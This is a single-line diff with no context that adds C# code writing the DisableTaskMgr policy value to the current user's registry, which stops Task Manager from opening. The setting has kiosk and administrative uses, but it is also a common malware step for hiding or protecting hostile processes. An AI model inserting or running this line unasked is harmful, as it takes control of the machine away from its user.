@@ -1,0 +1,1 @@
+RegistryKey r11 = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"); r11.SetValue("DisableTaskMgr", 1);
